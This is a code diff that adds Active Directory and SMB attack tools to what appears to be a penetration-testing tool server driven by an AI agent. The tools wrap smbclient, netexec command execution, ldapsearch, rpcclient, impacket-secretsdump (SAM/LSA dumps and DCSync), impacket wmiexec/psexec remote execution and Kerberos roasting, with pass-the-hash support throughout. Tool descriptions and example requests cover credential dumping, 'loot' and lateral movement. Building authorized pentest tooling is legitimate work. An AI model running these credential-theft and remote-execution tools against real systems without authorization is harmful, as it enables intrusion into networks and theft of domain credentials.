@@ -133,6 +133,46 @@ def _resolve_wordlist(name):
     return None
 
 
+# ── credentials (batch 2) ─────────────────────────────────────────────────────
+def _creds(a, require=False):
+    """(username, password, nthash, domain) — validated so they can't break the
+    argv/target-spec formats. password/hash are optional (null session), unless
+    `require` demands a username."""
+    user = (a.get("username") or "").strip()
+    password = str(a.get("password") if a.get("password") is not None else "")
+    nthash = (a.get("hash") or "").strip()
+    domain = (a.get("domain") or "").strip()
+    if require and not user:
+        raise ValueError("`username` is required for this tool")
+    if user and not re.match(r"^[^\s:/@\\%]+$", user):
+        raise ValueError("`username` has invalid characters")
+    if domain and not re.match(r"^[A-Za-z0-9._-]+$", domain):
+        raise ValueError("`domain` has invalid characters")
+    if nthash and not re.match(r"^[0-9a-fA-F:]{16,}$", nthash):
+        raise ValueError("`hash` must be an NT hash (hex) or LM:NT")
+    if re.search(r"[\x00-\x1f]", password):
+        raise ValueError("`password` has control characters")
+    return user, password, nthash, domain
+
+
+def _hashes_arg(nthash):
+    """impacket -hashes wants LMHASH:NTHASH; a bare NT hash becomes :NT."""
+    return nthash if ":" in nthash else ":" + nthash
+
+
+def _impacket_target(domain, user, password, host, with_pass=True):
+    """impacket target spec: [domain/]user[:password]@host."""
+    dpart = (domain + "/") if domain else ""
+    if with_pass and password:
+        return f"{dpart}{user}:{password}@{host}"
+    return f"{dpart}{user}@{host}"
+
+
+def _nxc_auth(user, password, nthash, domain):
+    out = (["-d", domain] if domain else []) + ["-u", user or ""]
+    return out + (["-H", nthash] if nthash else ["-p", password])
+
+
 def _run(argv, binary, timeout=DEFAULT_TIMEOUT):
     """Run one argv (no shell), return (text, is_error). Reports a missing tool
     cleanly; keeps partial output on timeout."""
@@ -471,6 +511,162 @@ def _b_nuclei(a):
     return argv, "nuclei", 900
 
 
+# ── SMB / AD batch (credentialed) ─────────────────────────────────────────────
+def _b_smb_client(a):
+    host = _req_host(a)
+    user, password, nthash, domain = _creds(a)
+    action = (a.get("action") or "list").lower()
+    share = (a.get("share") or "").strip()
+    path = (a.get("path") or "").strip()
+    if share and not re.match(r"^[A-Za-z0-9._$ -]+$", share):
+        raise ValueError("`share` has invalid characters")
+    if path and re.search(r"[;\x00-\x1f]", path):
+        raise ValueError("`path` has invalid characters")
+    if not user:
+        auth = ["-N"]                                 # null session
+    else:
+        userspec = f"{domain}\\{user}" if domain else user
+        if nthash:
+            auth = ["-U", f"{userspec}%{nthash}", "--pw-nt-hash"]
+        else:
+            auth = ["-U", f"{userspec}%{password}"]
+    if action == "list":
+        return ["smbclient", "-L", f"//{host}/"] + auth, "smbclient"
+    if action == "ls":
+        if not share:
+            raise ValueError("`share` is required for action=ls")
+        return (["smbclient", f"//{host}/{share}"] + auth
+                + ["-c", "ls " + (path or "\\")], "smbclient")
+    raise ValueError("`action` must be list or ls")
+
+
+_NXC_ACTIONS = {"shares": ["--shares"], "users": ["--users"], "groups": ["--groups"],
+                "rid": ["--rid-brute"], "sessions": ["--sessions"],
+                "disks": ["--disks"], "loggedon": ["--loggedon-users"],
+                "passpol": ["--pass-pol"]}
+
+
+def _b_nxc_smb(a):
+    host = _req_host(a)
+    user, password, nthash, domain = _creds(a)
+    action = (a.get("action") or "shares").lower()
+    argv = ["nxc", "smb", host] + _nxc_auth(user, password, nthash, domain)
+    if action == "exec":
+        cmd = _word(a, "command")
+        if re.search(r"[\x00-\x1f]", cmd):
+            raise ValueError("`command` has control characters")
+        argv += ["-x", cmd]
+    elif action in _NXC_ACTIONS:
+        argv += _NXC_ACTIONS[action]
+    else:
+        raise ValueError("`action` must be one of shares/users/groups/rid/sessions/"
+                         "disks/loggedon/passpol/exec")
+    return argv, "nxc", 300
+
+
+def _b_ldap_search(a):
+    host = _req_host(a)
+    user, password, nthash, domain = _creds(a)
+    base = (a.get("base_dn") or "").strip()
+    if base and not re.match(r"^[A-Za-z0-9=,. _-]+$", base):
+        raise ValueError("`base_dn` has invalid characters")
+    lfilter = (a.get("filter") or "(objectClass=*)").strip()
+    if re.search(r"[\x00-\x1f]", lfilter):
+        raise ValueError("`filter` has control characters")
+    port = _port(a, 389)
+    argv = ["ldapsearch", "-x", "-H", f"ldap://{host}:{port}"]
+    if user:                                          # else anonymous simple bind
+        argv += ["-D", f"{user}@{domain}" if domain else user, "-w", password]
+    if base:
+        argv += ["-b", base]
+    argv.append(lfilter)
+    attrs = (a.get("attributes") or "").strip()
+    if attrs:
+        if not re.match(r"^[A-Za-z0-9,]+$", attrs):
+            raise ValueError("`attributes` must be comma-separated names")
+        argv += attrs.split(",")
+    return argv, "ldapsearch", 120
+
+
+def _b_rpc_enum(a):
+    host = _req_host(a)
+    user, password, nthash, domain = _creds(a)
+    cmds = (a.get("commands") or "enumdomusers;enumdomgroups;querydominfo").strip()
+    if not re.match(r"^[A-Za-z0-9;_ .-]+$", cmds):
+        raise ValueError("`commands` has invalid characters")
+    if user:
+        userspec = f"{domain}\\{user}" if domain else user
+        auth = ["-U", f"{userspec}%{password}"]
+    else:
+        auth = ["-N", "-U", ""]                       # null session
+    return ["rpcclient"] + auth + ["-c", cmds, host], "rpcclient", 120
+
+
+def _b_secretsdump(a):
+    host = _req_host(a)
+    user, password, nthash, domain = _creds(a, require=True)
+    target = _impacket_target(domain, user, password, host, with_pass=not nthash)
+    argv = ["impacket-secretsdump", target]
+    if nthash:
+        argv += ["-hashes", _hashes_arg(nthash)]
+    if a.get("just_dc"):
+        argv.append("-just-dc")                       # DCSync-only (fast, DC creds)
+    return argv, "impacket-secretsdump", 600
+
+
+_IMPACKET_EXEC = {"wmiexec": "impacket-wmiexec", "psexec": "impacket-psexec",
+                  "smbexec": "impacket-smbexec", "atexec": "impacket-atexec"}
+
+
+def _b_impacket_exec(a):
+    host = _req_host(a)
+    user, password, nthash, domain = _creds(a, require=True)
+    method = (a.get("method") or "wmiexec").lower()
+    if method not in _IMPACKET_EXEC:
+        raise ValueError("`method` must be wmiexec/psexec/smbexec/atexec")
+    command = _word(a, "command")
+    if re.search(r"[\x00-\x1f]", command):
+        raise ValueError("`command` has control characters")
+    target = _impacket_target(domain, user, password, host, with_pass=not nthash)
+    argv = [_IMPACKET_EXEC[method], target]
+    if nthash:
+        argv += ["-hashes", _hashes_arg(nthash)]
+    argv.append(command)                              # single command, non-interactive
+    return argv, _IMPACKET_EXEC[method], 300
+
+
+def _b_kerberos_roast(a):
+    dc = (a.get("dc") or a.get("host") or "").strip()
+    if not dc or "/" in dc or not _HOST_RE.match(dc):
+        raise ValueError("`dc` (domain controller host/IP) is required")
+    domain = (a.get("domain") or "").strip()
+    if not domain or not re.match(r"^[A-Za-z0-9._-]+$", domain):
+        raise ValueError("`domain` is required (e.g. corp.local)")
+    user, password, nthash, _d = _creds(a)
+    mode = (a.get("mode") or "kerberoast").lower()
+    if mode == "kerberoast":
+        if not user:
+            raise ValueError("kerberoast needs credentials (username + password/hash)")
+        argv = ["impacket-GetUserSPNs", f"{domain}/{user}:{password}",
+                "-dc-ip", dc, "-request"]
+        if nthash:
+            argv += ["-hashes", _hashes_arg(nthash)]
+        return argv, "impacket-GetUserSPNs", 300
+    if mode == "asrep":
+        if user:                                      # authenticated: list AS-REP-able
+            argv = ["impacket-GetNPUsers", f"{domain}/{user}:{password}",
+                    "-dc-ip", dc, "-request", "-format", "hashcat"]
+            if nthash:
+                argv += ["-hashes", _hashes_arg(nthash)]
+            return argv, "impacket-GetNPUsers", 300
+        target_user = (a.get("target_user") or "").strip()
+        if not target_user or not re.match(r"^[^\s:/@\\%]+$", target_user):
+            raise ValueError("AS-REP without creds needs `target_user`")
+        return (["impacket-GetNPUsers", f"{domain}/{target_user}", "-dc-ip", dc,
+                 "-no-pass", "-format", "hashcat"], "impacket-GetNPUsers", 300)
+    raise ValueError("`mode` must be kerberoast or asrep")
+
+
 # name -> (builder, description, inputSchema, timeout)
 _H = {"type": "string", "description": "Target host — a single IP or hostname "
       "(no CIDR/subnet)."}
@@ -482,6 +678,13 @@ _TIMING = {"type": "string", "description": "nmap timing T0-T5 (default T4; lowe
            "slower/stealthier for filtered or laggy hosts)."}
 _HOSTDISC = {"type": "boolean", "description": "false (default) uses -Pn (assume up); "
              "true lets nmap ping the host first."}
+# shared credential fields (passed on the command line — authorized testing only):
+_USER = {"type": "string", "description": "Username (omit for null/anonymous where "
+         "the service allows it)."}
+_PASS = {"type": "string", "description": "Password."}
+_HASH = {"type": "string", "description": "NT hash (or LM:NT) for pass-the-hash, "
+         "instead of a password."}
+_DOMAIN = {"type": "string", "description": "AD domain / workgroup (optional)."}
 
 HACKTOOLS = {
     "port_discovery": (
@@ -691,6 +894,93 @@ HACKTOOLS = {
             "tags": {"type": "string", "description": "Template tags, e.g. cve,"
                      "exposure,wordpress."}},
          "required": ["url"]}, 900),
+    "smb_client": (
+        _b_smb_client,
+        "List SMB shares, or list a share's contents, with smbclient. Works with a "
+        "null session or credentials (password or NT hash).",
+        {"type": "object", "properties": {
+            "host": _H,
+            "action": {"type": "string", "description": "list (shares, default) or ls "
+                       "(a share's files)."},
+            "share": {"type": "string", "description": "Share name (required for ls)."},
+            "path": {"type": "string", "description": "Path inside the share for ls "
+                     "(default root)."},
+            "username": _USER, "password": _PASS, "hash": _HASH, "domain": _DOMAIN},
+         "required": ["host"]}, 120),
+    "netexec_smb": (
+        _b_nxc_smb,
+        "Enumerate or act on SMB with netexec (nxc): shares, users, groups, rid-brute, "
+        "sessions, disks, logged-on users, password policy — or exec a single command "
+        "(needs admin). Null session or credentials (password/NT hash).",
+        {"type": "object", "properties": {
+            "host": _H,
+            "action": {"type": "string", "description": "shares (default) · users · "
+                       "groups · rid · sessions · disks · loggedon · passpol · exec."},
+            "command": {"type": "string", "description": "Command to run when "
+                        "action=exec (single command via SMB)."},
+            "username": _USER, "password": _PASS, "hash": _HASH, "domain": _DOMAIN},
+         "required": ["host"]}, 300),
+    "ldap_search": (
+        _b_ldap_search,
+        "Query LDAP / Active Directory with ldapsearch — users, groups, computers, any "
+        "attributes. Anonymous or authenticated bind.",
+        {"type": "object", "properties": {
+            "host": _H, "port": _PORT,
+            "base_dn": {"type": "string", "description": "Search base, e.g. "
+                        "DC=corp,DC=local."},
+            "filter": {"type": "string", "description": "LDAP filter (default "
+                       "(objectClass=*)), e.g. (objectClass=user)."},
+            "attributes": {"type": "string", "description": "Comma-separated attrs to "
+                           "return, e.g. sAMAccountName,description."},
+            "username": _USER, "password": _PASS, "domain": _DOMAIN},
+         "required": ["host"]}, 120),
+    "rpc_enum": (
+        _b_rpc_enum,
+        "Enumerate a Windows host over MSRPC with rpcclient (users, groups, domain "
+        "info). Null session or credentials.",
+        {"type": "object", "properties": {
+            "host": _H,
+            "commands": {"type": "string", "description": "Semicolon rpcclient "
+                         "commands (default enumdomusers;enumdomgroups;querydominfo)."},
+            "username": _USER, "password": _PASS, "domain": _DOMAIN},
+         "required": ["host"]}, 120),
+    "secretsdump": (
+        _b_secretsdump,
+        "Dump secrets from a host with impacket-secretsdump — SAM/LSA/cached creds, or "
+        "DCSync the domain (just_dc) with DC credentials. Requires credentials "
+        "(password or NT hash).",
+        {"type": "object", "properties": {
+            "host": _H,
+            "username": _USER, "password": _PASS, "hash": _HASH, "domain": _DOMAIN,
+            "just_dc": {"type": "boolean", "description": "DCSync only (-just-dc) — "
+                        "domain hashes via a DC, faster."}},
+         "required": ["host", "username"]}, 600),
+    "impacket_exec": (
+        _b_impacket_exec,
+        "Run ONE command on a Windows host with valid credentials via impacket "
+        "(wmiexec/psexec/smbexec/atexec). Not an interactive shell. Password or NT "
+        "hash.",
+        {"type": "object", "properties": {
+            "host": _H,
+            "method": {"type": "string", "description": "wmiexec (default) · psexec · "
+                       "smbexec · atexec."},
+            "command": {"type": "string", "description": "The single command to run, "
+                        "e.g. 'whoami /all'."},
+            "username": _USER, "password": _PASS, "hash": _HASH, "domain": _DOMAIN},
+         "required": ["host", "username", "command"]}, 300),
+    "kerberos_roast": (
+        _b_kerberos_roast,
+        "Request Kerberos hashes for offline cracking: kerberoast (SPN accounts, needs "
+        "creds) or asrep (AS-REP-roastable accounts; a single target_user works with "
+        "no creds). Needs the DC and domain.",
+        {"type": "object", "properties": {
+            "dc": {"type": "string", "description": "Domain controller host/IP."},
+            "domain": {"type": "string", "description": "AD domain, e.g. corp.local."},
+            "mode": {"type": "string", "description": "kerberoast (default) or asrep."},
+            "target_user": {"type": "string", "description": "For asrep without creds "
+                            "— a username to test."},
+            "username": _USER, "password": _PASS, "hash": _HASH},
+         "required": ["dc", "domain"]}, 300),
 }
 
 
@@ -851,6 +1141,73 @@ _META = {
         ["run nuclei against the target url", "scan for CVEs with nuclei",
          "check for known web vulnerabilities", "nuclei high and critical only",
          "find exposures on the website"]),
+    "smb_client": (
+        "List SMB shares or a share's files (smbclient).",
+        "SMB share access with smbclient: list the shares on a host, or list the files "
+        "inside a share, using a null session or credentials (password or NT hash / "
+        "pass-the-hash). Keywords: smbclient, smb, cifs, shares, share listing, "
+        "port 445, null session, pass the hash, windows file share, loot.",
+        ["list the smb shares on 10.0.0.5", "browse the share with these credentials",
+         "list files in the ADMIN$ share", "smbclient null session shares",
+         "access smb with the NT hash"]),
+    "netexec_smb": (
+        "Enumerate or exec over SMB with netexec (nxc).",
+        "SMB enumeration and command execution with netexec/nxc: dump shares, users, "
+        "groups, rid-brute the domain, sessions, disks, logged-on users, password "
+        "policy — or run a single command with admin creds (-x). Password or NT hash, "
+        "null session supported. Keywords: netexec, nxc, crackmapexec, cme, smb, "
+        "rid brute, --shares, --users, pass the hash, exec, lateral movement, spider.",
+        ["nxc smb shares with these creds", "rid-brute the domain over smb",
+         "enumerate smb users with netexec", "run whoami on the host via smb",
+         "check the password policy over smb"]),
+    "ldap_search": (
+        "Query LDAP / Active Directory (ldapsearch).",
+        "LDAP / Active Directory query with ldapsearch: enumerate users, groups, "
+        "computers, service accounts, descriptions and any attributes, anonymous or "
+        "authenticated bind, with a custom base DN and filter. Keywords: ldap, "
+        "ldapsearch, active directory, AD, base dn, ldap filter, sAMAccountName, "
+        "objectClass, port 389, 636, bind, directory enumeration.",
+        ["ldap search for all users", "query active directory over ldap",
+         "enumerate AD groups with ldapsearch", "anonymous ldap bind and dump",
+         "search ldap with base dn DC=corp,DC=local"]),
+    "rpc_enum": (
+        "Enumerate a Windows host over MSRPC (rpcclient).",
+        "MSRPC enumeration with rpcclient: enumerate domain users, groups and domain "
+        "info over a null session or with credentials. Keywords: rpcclient, msrpc, "
+        "enumdomusers, enumdomgroups, querydominfo, port 135, 445, null session, "
+        "windows enumeration, SID, lsa.",
+        ["rpcclient enumdomusers on the host", "enumerate domain users over rpc",
+         "null session rpcclient enumeration", "query domain info with rpcclient"]),
+    "secretsdump": (
+        "Dump SAM/LSA or DCSync hashes (impacket-secretsdump).",
+        "Credential dumping with impacket-secretsdump: extract SAM, LSA secrets and "
+        "cached credentials from a host, or DCSync the whole domain (just_dc) with "
+        "domain-admin / DC credentials. Needs creds (password or NT hash). Keywords: "
+        "secretsdump, impacket, dump hashes, SAM, LSA, NTDS, DCSync, cached "
+        "credentials, ntlm hashes, credential dump, post-exploitation.",
+        ["dump hashes from the host with these creds", "secretsdump SAM and LSA",
+         "dcsync the domain with the DC hash", "extract cached credentials",
+         "impacket secretsdump just-dc"]),
+    "impacket_exec": (
+        "Run one command on Windows with creds (impacket).",
+        "Remote command execution on Windows with impacket: run a single command via "
+        "wmiexec, psexec, smbexec or atexec using valid credentials (password or NT "
+        "hash / pass-the-hash). Not an interactive shell. Keywords: wmiexec, psexec, "
+        "smbexec, atexec, impacket, remote command, RCE, lateral movement, pass the "
+        "hash, run command windows, execute.",
+        ["run whoami on the windows host with these creds", "wmiexec a command",
+         "psexec with the NT hash to run a command", "execute ipconfig remotely via smb",
+         "impacket exec with domain creds"]),
+    "kerberos_roast": (
+        "Request Kerberos hashes: kerberoast / AS-REP roast.",
+        "Kerberos attacks with impacket: kerberoast (request TGS hashes for SPN "
+        "accounts, needs domain creds) or AS-REP roast (accounts without pre-auth; a "
+        "single target_user works with no creds). Output is hashcat-format for offline "
+        "cracking. Keywords: kerberos, kerberoast, asreproast, AS-REP, GetUserSPNs, "
+        "GetNPUsers, SPN, TGS, TGT, hashcat, offline cracking, active directory.",
+        ["kerberoast the domain with these creds", "asrep roast the target user",
+         "request SPN hashes for cracking", "GetNPUsers without a password",
+         "kerberoasting with impacket"]),
 }
 
 
@@ -992,6 +1349,13 @@ def selftest():
         ("web_content_discovery", {"url": "http://x", "wordlist": "zzz"}, True),  # bad wl
         ("whatweb", {"url": "http://x", "aggression": 9}, True),   # 1-4
         ("nuclei_scan", {"url": "http://x", "severity": "HIGH!"}, True),   # bad sev
+        ("smb_client", {"host": "10.0.0.5"}, False),      # null-session list ok
+        ("smb_client", {"host": "10.0.0.5", "username": "a b"}, True),   # bad user
+        ("netexec_smb", {"host": "10.0.0.5", "action": "exec"}, True),   # exec needs cmd
+        ("secretsdump", {"host": "10.0.0.5"}, True),      # needs username
+        ("impacket_exec", {"host": "10.0.0.5", "username": "u", "hash": "xyz"}, True),  # bad hash
+        ("kerberos_roast", {"dc": "10.0.0.5"}, True),     # needs domain
+        ("kerberos_roast", {"dc": "10.0.0.5", "domain": "corp.local"}, True),  # kerb needs creds
     ):
         b = HACKTOOLS[name][0]
         try:
